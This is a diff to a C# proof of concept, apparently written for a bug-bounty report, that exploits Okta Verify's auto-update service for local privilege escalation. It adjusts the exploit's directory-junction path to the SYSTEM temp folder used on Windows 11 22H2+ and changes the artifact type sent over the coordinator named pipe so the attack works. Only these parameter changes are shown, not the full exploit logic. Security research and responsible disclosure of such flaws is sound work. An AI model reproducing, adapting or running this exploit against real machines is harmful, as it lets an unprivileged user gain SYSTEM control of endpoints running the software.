@@ -51,8 +51,10 @@ namespace OktaLpeCombined
     {
         const string COORDINATOR_PIPE = "Okta.Coordinator.pipe";
         const string UPDATE_URL = "https://bugcrowd-pam-4593.oktapreview.com";
-        const string JUNCTION_SOURCE = @"C:\Windows\Temp\Okta-AutoUpdate";
-        const string PROOF_DIR = @"C:\Windows\Temp\okta-lpe-proof";
+        // On Windows 11 22H2+, SYSTEM's Path.GetTempPath() returns C:\WINDOWS\SystemTemp\
+        // CleanPreviousDownloads uses Path.GetTempPath() so the junction must be here.
+        const string JUNCTION_SOURCE = @"C:\WINDOWS\SystemTemp\Okta-AutoUpdate";
+        const string PROOF_DIR = @"C:\WINDOWS\SystemTemp\okta-lpe-proof";
         const string EVIDENCE_LOG = @"C:\Windows\Temp\okta-lpe-evidence.log";
 
         // --- P/Invoke declarations ---
@@ -587,7 +589,7 @@ namespace OktaLpeCombined
                     EventLogName = "Okta Verify",
                     EventSourceName = "OktaVerify",
                     ReleaseChannel = "GA",
-                    ArtifactType = "OktaVerify",
+                    ArtifactType = "WINDOWS_OKTA_VERIFY",
                     PipeName = pipeName,
                     BucketId = "0",
                     UserId = null
